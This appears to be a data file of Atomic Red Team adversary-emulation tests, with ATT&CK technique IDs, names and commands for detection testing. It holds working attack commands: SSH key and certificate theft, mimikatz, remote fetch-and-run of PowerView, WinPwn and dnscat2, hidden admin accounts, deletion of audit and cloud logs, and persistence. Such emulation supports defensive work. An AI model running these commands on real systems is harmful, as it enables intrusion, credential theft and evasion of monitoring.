T1547,Edit an existing time provider,"net stop w32time copy-item ""$pathtoatomicsfolder\t1547.003\bin\atomictest.dll"" c:\users\public\atomictest.dll reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_sz /v ""dllname"" /d ""c:\users\public\atomictest.dll"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_dword /v ""enabled"" /d ""1"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ntpserver"" /t reg_dword /v ""inputprovider"" /d ""1"" /f net start w32time"
T1552,Private Keys,dir c:\ /b /s .key | findstr /e .key
T1552,Discover Private SSH Keys,find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} exit 0
T1552,Copy Private SSH Keys with CP,mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \; exit 0
T1552,Copy Private SSH Keys with CP (freebsd),mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \;
T1552,Copy Private SSH Keys with rsync,mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec rsync -r {} #{output_folder} \; exit 0
T1552,Copy Private SSH Keys with rsync (freebsd),mkdir #{output_folder} find #{search_path} -name id_rsa 2>/dev/null -exec rsync -r {} #{output_folder} \;
T1552,Copy the users GnuPG directory with rsync,mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \; exit 0
T1552,Copy the users GnuPG directory with rsync (freebsd),mkdir #{output_folder} find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -rr {} #{output_folder} \;
T1552,ADFS token signing and encryption certificates theft - Local,"import-module aadinternals -force export-aadintadfscertificates get-childitem | where-object {$_ -like ""adfs*""} write-host ""`ncertificates retrieved successfully"""
T1552,ADFS token signing and encryption certificates theft - Remote,"import-module activedirectory -force import-module aadinternals -force | out-null #get configuration $dcservername = (get-addomaincontroller).hostname $svc = get-adobject -filter * -properties objectguid,objectsid | where-object name -eq ""#{adfs_service_account_name}"" $pword = convertto-securestring -string ""#{replication_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{replication_user}, $pword # use dcsync to fetch the adfs service account's nt hash $hash = get-aadintadusernthash -objectguid $svc.objectguid -credentials $credential -server $dcservername -ashex $adfsconfig = export-aadintadfsconfiguration -hash $hash -sid $svc.objectsid.value -server #{adfs_server_name} # get certificates decryption key $configuration = [xml]$adfsconfig $group = $configuration.servicesettingsdata.policystore.dkmsettings.group $container = $configuration.servicesettingsdata.policystore.dkmsettings.containername $parent = $configuration.servicesettingsdata.policystore.dkmsettings.parentcontainerdn $base = ""ldap://cn=$group,$container,$parent"" $adsearch = [system.directoryservices.directorysearcher]::new([system.directoryservices.directoryentry]::new($base)) $adsearch.filter = '(name=cryptopolicy)' $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""displayname"") | out-null $aduser = $adsearch.findone() $keyobjectguid = $aduser.properties[""displayname""] $adsearch.propertiestoload.clear() $adsearch.propertiestoload.add(""thumbnailphoto"") | out-null $adsearch.filter=""(l=$keyobjectguid)"" $aduser=$adsearch.findone() $key=[byte[]]$aduser.properties[""thumbnailphoto""][0] # get encrypted certificates from configuration and decrypt them export-aadintadfscertificates -configuration $adfsconfig -key $key get-childitem | where-object {$_ -like ""adfs*""} write-host ""`ncertificates retrieved successfully"""
T1552,CertUtil ExportPFX,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing) certutil.exe -p #{password} -exportpfx root 1f3d38f280635f275be92b87cf83e40e40458400 #{output}
T1552,Export Root Certificate with Export-PFXCertificate,"$mypwd = convertto-securestring -string ""atomicredteam"" -force -asplaintext $cert = new-selfsignedcertificate -dnsname atomicredteam.com -certstorelocation cert:\localmachine\my set-location cert:\localmachine\my get-childitem -path $cert.thumbprint | export-pfxcertificate -filepath #{pfx_path} -password $mypwd"
T1552,Export Root Certificate with Export-Certificate,$cert = new-selfsignedcertificate -dnsname atomicredteam.com -certstorelocation cert:\localmachine\my set-location cert:\localmachine\my export-certificate -type cert -cert cert:\localmachine\my\$($cert.thumbprint) -filepath #{pfx_path}
T1552,Export Certificates with Mimikatz,"""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit"
T1070,Indicator Removal using FSUtil,fsutil usn deletejournal /d c:
T1070,Indicator Manipulation using FSUtil,"if (-not (test-path ""#{file_to_manipulate}"")) { new-item ""#{file_to_manipulate}"" -force } echo ""1234567890"" > ""#{file_to_manipulate}"" fsutil file setzerodata offset=0 length=#{file_data_length} ""#{file_to_manipulate}"""
T1070,Copy and Delete Mailbox Data on Windows,"new-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -itemtype directory -erroraction ignore get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data"" -exclude copy | foreach-object { copy-item -path $_.fullname -destination ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore } remove-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore"
T1070,Copy and Delete Mailbox Data on Linux,"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -r ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*"
T1070,Copy and Delete Mailbox Data on macOS,mkdir ~/library/mail/copy cp -r ~/library/mail/* ~/library/mail/copy rm -rf ~/library/mail/copy/*
T1070,Copy and Modify Mailbox Data on Windows,"new-item -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -itemtype directory -erroraction ignore get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data"" -exclude copy | foreach-object { copy-item -path $_.fullname -destination ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -recurse -force -erroraction ignore } get-childitem -path ""c:\users\$env:username\appdata\local\comms\unistore\data\copy"" -file | foreach-object { add-content -path $_.fullname -value ""modification for atomic red test"" -erroraction ignore }"
T1070,Copy and Modify Mailbox Data on Linux,"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -r ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""modification for atomic red test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done"
T1070,Copy and Modify Mailbox Data on macOS,"mkdir ~/library/mail/copy cp -r ~/library/mail/* ~/library/mail/copy echo ""manipulated data"" > ~/library/mail/copy/manipulated.txt"
T1547,Add Port Monitor persistence in Registry,"reg add ""hklm\system\currentcontrolset\control\print\monitors\atomicredteam"" /v ""driver"" /d ""#{monitor_dll}"" /t reg_sz /f"
T1218,CMSTP Executing Remote Scriptlet,"cmstp.exe /s ""#{inf_file_path}"""
T1218,CMSTP Executing UAC Bypass,"cmstp.exe /s ""#{inf_file_uac}"" /au"
T1552,List All Secrets,kubectl get secrets --all-namespaces
T1552,ListSecrets,kubectl get secrets -n #{namespace}
T1552,Cat the contents of a Kubernetes service account token file,kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
T1202,Indirect Command Execution - pcalua.exe,pcalua.exe -a #{process} pcalua.exe -a #{payload_path}
T1202,Indirect Command Execution - forfiles.exe,forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
T1202,Indirect Command Execution - conhost.exe,"conhost.exe ""#{process}"""
T1202,Indirect Command Execution - Scriptrunner.exe,"scriptrunner.exe -appvscript ""#{payload_path}"""
T1202,Indirect Command Execution - RunMRU Dialog,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}')"
T1595,Web Server Wordlist Scan,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
T1127,MSBuild Bypass Using Inline Tasks (C#),"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1127,MSBuild Bypass Using Inline Tasks (VB),"#{msbuildpath}\#{msbuildname} ""#{filename}"""
T1564,New-Inbox Rule to Hide E-mail in M365,"import-module exchangeonlinemanagement $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password connect-exchangeonline -credential $credential -erroraction:silentlycontinue new-inboxrule -mailbox #{target_mailbox} -name #{mail_rulename} -subjectorbodycontainswords (""phish"",""malware"",""hacked"") -confirm:$false -deletemessage:$true"
T1543,Modify Fax service to run PowerShell,"sc config #{service_name} binpath= ""c:\windows\system32\windowspowershell\v1.0\powershell.exe -noexit -c \""write-host 't1543.003 test'\"""" sc start #{service_name}"
T1543,Service Installation CMD,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name}"
T1543,Service Installation PowerShell,"new-service -name ""#{service_name}"" -binarypathname ""#{binary_path}"" start-service -name ""#{service_name}"""
T1543,TinyTurla backdoor service w64time,"copy ""#{dllfilename}"" %systemroot%\system32\ sc create w64time binpath= ""c:\windows\system32\svchost.exe -k timeservice"" type= share start=auto sc config w64time displayname= ""windows 64 time"" sc description w64time ""maintain date and time synch on all clients and services in the network"" reg add ""hklm\software\microsoft\windows nt\currentversion\svchost"" /v timeservice /t reg_multi_sz /d ""w64time"" /f reg add ""hklm\system\currentcontrolset\services\w64time\parameters"" /v servicedll /t reg_expand_sz /d ""%systemroot%\system32\w64time.dll"" /f sc start w64time"
T1543,Remote Service Installation CMD,"sc.exe \\#{remote_host} create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe \\#{remote_host} start #{service_name}"
T1543,Modify Service to Run Arbitrary Binary (Powershell),"stop-service -name ""#{service_name}"" -force -erroraction silentlycontinue | out-null set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}"" start-service -name ""#{service_name}"" -erroraction silentlycontinue | out-null"
T1071,Malicious User Agents - Powershell,"invoke-webrequest #{domain} -useragent ""httpbrowser/1.0"" | out-null invoke-webrequest #{domain} -useragent ""wget/1.9+cvs-stable (red hat modified)"" | out-null invoke-webrequest #{domain} -useragent ""opera/8.81 (windows nt 6.0; u; en)"" | out-null invoke-webrequest #{domain} -useragent ""*<|>*"" | out-null"
T1071,Malicious User Agents - CMD,"#{curl_path} -s -a ""httpbrowser/1.0"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""*<|>*"" -m3 #{domain} >nul 2>&1"
T1071,Malicious User Agents - Nix,"curl -s -a ""httpbrowser/1.0"" -m3 #{domain} curl -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} curl -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} curl -s -a ""*<|>*"" -m3 #{domain}"
T1136,Create a user account on a Linux system,useradd -m -n -r -s /bin/bash -c evil_account #{username}
T1136,Create a user account on a FreeBSD system,pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
T1136,Create a user account on a MacOS system,"dscl . -create /users/#{username} dscl . -create /users/#{username} usershell /bin/zsh dscl . -create /users/#{username} realname ""#{realname}"" dscl . -create /users/#{username} uniqueid ""1010"" dscl . -create /users/#{username} primarygroupid 80 dscl . -create /users/#{username} nfshomedirectory /users/#{username}"
T1136,Create a new user in a command prompt,"net user /add ""#{username}"" ""#{password}"""
T1136,Create a new user in PowerShell,"new-localuser -name ""#{username}"" -nopassword"
T1136,Create a new user in Linux with `root` UID and GID.,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;"
T1136,Create a new user in FreeBSD with `root` GID.,"pw useradd #{username} -g 0 -d /root -s /bin/sh echo ""#{password}"" | pw usermod #{username} -h 0"
T1136,Create a new Windows admin user,"net user /add ""#{username}"" ""#{password}"" net localgroup administrators ""#{username}"" /add"
T1136,Create a new Windows admin user via .NET,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/persistence/createnewlocaladmin_art.ps1')
T1136,Create a Linux user via kubectl in a Pod,kubectl run #{pod_name} --image=#{image_name} --restart=never --rm -it -- sh -lc 'adduser -d #{username} && id #{username}'
T1572,DNS over HTTPS Large Query Volume,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }"
T1572,DNS over HTTPS Regular Beaconing,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime}"
T1572,DNS over HTTPS Long Domain Query,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-domain-length.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1572,run ngrok,c:\users\public\ngrok\ngrok.exe config add-authtoken #{api_token} | out-null start-job -scriptblock { c:\users\public\ngrok\ngrok.exe tcp #{port_num} } | out-null start-sleep -s 5 stop-job -name job1 | out-null
T1572,Microsoft Dev tunnels (Linux/macOS),#{binary_path} host -p #{port} &
T1572,VSCode tunnels (Linux/macOS),nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &
T1572,Cloudflare tunnels (Linux/macOS),nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
T1135,Network Share Discovery,df -ah smbutil view -g //#{computer_name} showmount #{computer_name}
T1135,Network Share Discovery - linux,smbstatus --shares
T1135,Network Share Discovery - FreeBSD,smbstatus --shares
T1135,Network Share Discovery command prompt,net view \\#{computer_name}
T1135,Network Share Discovery PowerShell,get-smbshare
T1135,View available share drives,net share
T1135,Share Discovery with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); find-domainshare -checkshareaccess -verbose
T1135,PowerView ShareFinder,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder #{parameters}"
T1135,WinPwn - shareenumeration,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') shareenumeration -noninteractive -consoleoutput
T1135,Network Share Discovery via dir command,dir \\#{computer_ip}\c$ dir \\#{computer_ip}\admin$ dir \\#{computer_ip}\ipc$
T1135,Enumerate All Network Shares with SharpShares,"cmd /c '#{sharp_path}' /ldap:all | out-file -filepath ""#{output_path}"""
T1135,Enumerate All Network Shares with Snaffler,"invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'"
T1556,Install and Register Password Filter DLL,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""#{dll_path}\#{dll_name}"" -destination ""c:\windows\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $notificationpackagesvalues = $lsakey.getvalue(""notification packages"") $notificationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""notification packages"" $notificationpackagesvalues"
T1556,Install Additional Authentication Packages,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""#{dll_path}\#{dll_name}"" -destination ""c:\windows\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $authenticationpackagesvalues = $lsakey.getvalue(""authentication packages"") $authenticationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""authentication packages"" $authenticationpackagesvalues"
T1592,Enumerate PlugNPlay Camera,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1218,Compiled HTML Help Local Payload,"hh.exe ""#{local_chm_file}"""
T1218,Compiled HTML Help Remote Payload,hh.exe #{remote_chm_file}
T1218,Invoke CHM with default Shortcut Command Execution,invoke-athcompiledhelp -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM with InfoTech Storage Protocol Handler,invoke-athcompiledhelp -infotechstoragehandler #{infotech_storage_handler} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM Simulate Double click,invoke-athcompiledhelp -simulateuserdoubleclick -chmfilepath #{chm_file_path}
T1218,Invoke CHM with Script Engine and Help Topic,invoke-athcompiledhelp -scriptengine #{script_engine} -infotechstoragehandler #{infotech_storage_handler} -topicextension #{topic_extension} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Invoke CHM Shortcut Command with ITS and Help Topic,invoke-athcompiledhelp -executeshortcutcommand -infotechstoragehandler #{infotech_storage_handler} -topicextension #{topic_extension} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}
T1218,Decompile Local CHM File,"hh.exe -decompile %temp% ""#{local_chm_file}"""
T1546,Change Default File Association,assoc #{extension_to_change}=#{target_extension_handler}
T1071,DNS Large Query Volume,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout}"
T1071,DNS Regular Beaconing,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-beacon.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime}"
T1071,DNS Long Domain Query,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-domain-length.ps1 -domain #{domain} -subdomain #{subdomain} -querytype #{query_type}"
T1071,DNS C2,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') start-dnscat2 -domain #{domain} -dnsserver #{server_ip}
T1114,Office365 - Remote Mail Collected,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject}"
T1482,Windows - Discover domain trusts with dsquery,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *"
T1482,Windows - Discover domain trusts with nltest,nltest /domain_trusts nltest /trusted_domains
T1482,Powershell enumerate domains and forests,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" get-netdomaintrust get-netforesttrust get-addomain get-adgroupmember administrators -recursive ([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()"
T1482,Adfind - Enumerate Active Directory OUs,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=organizationalunit) #{optional_args}"
T1482,Adfind - Enumerate Active Directory Trusts,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -gcb -sc trustdmp"
T1482,Get-DomainTrust with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domaintrust -verbose
T1482,Get-ForestTrust with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-foresttrust -verbose
T1482,TruffleSnout - Listing AD Infrastructure,"""#{trufflesnout_path}"" forest -n #{domain} ""#{trufflesnout_path}"" domain -n #{domain}"
T1574,Execution of program.exe as service with unquoted service path,"copy ""#{service_executable}"" ""c:\program files\windows_service.exe"" copy ""#{service_executable}"" ""c:\program.exe"" sc create ""example service"" binpath= ""c:\program files\windows_service.exe"" displayname= ""example service"" start= auto sc start ""example service"""
T1119,Automated Collection Command Prompt,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: /b /s .docx | findstr /e .docx for /r c:\ %f in (*.docx) do copy /y %f %temp%\t1119_command_prompt_collection
T1119,Automated Collection PowerShell,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1119,Recon information for export with PowerShell,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt
T1119,Recon information for export with Command Prompt,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1562,AWS - CloudTrail Changes,aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --is-multi-region-trail --region #{region} aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region} aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
T1562,Azure - Eventhub Deletion,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-azuread -credential $creds remove-azeventhub -resourcegroupname #{resource_group} -namespace #{name_space_name} -name #{event_hub_name}"
T1562,Office 365 - Exchange Audit Log Disabled,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds set-adminauditlogconfig -unifiedauditlogingestionenabled $false"
T1562,AWS - Disable CloudTrail Logging Through Event Selectors using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors echo ""starting detonate"" ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force"
T1562,AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule echo ""starting detonate"" ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"
T1562,AWS - Remove VPC Flow Logs using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs echo ""starting detonate"" ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force"
T1562,AWS - CloudWatch Log Group Deletes,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group created ***"" aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group deleted ***"""
T1562,AWS CloudWatch Log Stream Deletes,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group created ***"" aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region} echo ""*** log stream created ***"" aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region} echo ""*** log stream deleted ***"" aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group deleted ***"""
T1562,Office 365 - Set Audit Bypass For a Mailbox,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds set-mailboxauditbypassassociation -identity ""#{target_email}"" -auditbypassenabled $true"
T1562,GCP - Delete Activity Event Log,gcloud config set project #{project-id} gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2factivity --quiet
T1564,Create Hidden User using UniqueID < 500,sudo dscl . -create /users/#{user_name} uniqueid 333
T1564,Create Hidden User using IsHidden option,sudo dscl . -create /users/#{user_name} ishidden 1
T1564,Create Hidden User in Registry,"net user #{user_name}$ #{user_password} /add /expires:never reg add ""hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist"" /v #{user_name}$ /t reg_dword /d 0"
T1548,Sudo usage,sudo -l sudo cat /etc/sudoers sudo vim /etc/sudoers
T1548,Sudo usage (freebsd),sudo -l sudo cat /usr/local/etc/sudoers sudo ee /usr/local/etc/sudoers
T1548,Unlimited sudo cache timeout,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers sudo visudo -c -f /etc/sudoers"
T1548,Unlimited sudo cache timeout (freebsd),"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
T1548,Disable tty_tickets for sudo caching,"sudo sh -c ""echo defaults ""'!'""tty_tickets >> /etc/sudoers"" sudo visudo -c -f /etc/sudoers"
T1548,Disable tty_tickets for sudo caching (freebsd),"sudo sh -c ""echo defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers"" sudo visudo -c -f /usr/local/etc/sudoers"
T1518,Security Software Discovery,"netsh.exe advfirewall show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c ""get-process | where-object { $_.processname -eq 'sysmon' }"" powershell.exe /c ""get-service | where-object {$_.displayname -like '*sysm*'}"" powershell.exe /c ""get-ciminstance win32_service -filter 'description = ''system monitor service'''"" tasklist.exe tasklist.exe | findstr /i virus tasklist.exe | findstr /i cb tasklist.exe | findstr /i defender tasklist.exe | findstr /i cylance tasklist.exe | findstr /i mc tasklist.exe | findstr /i ""virus cb defender cylance mc"""
T1518,Security Software Discovery - powershell,"get-process | ?{$_.description -like ""*virus*""} get-process | ?{$_.description -like ""*carbonblack*""} get-process | ?{$_.description -like ""*defender*""} get-process | ?{$_.description -like ""*cylance*""} get-process | ?{$_.description -like ""*mc*""} get-process | ?{$_.processname -like ""*mc*""} get-process | where-object { $_.processname -eq ""sysmon"" }"
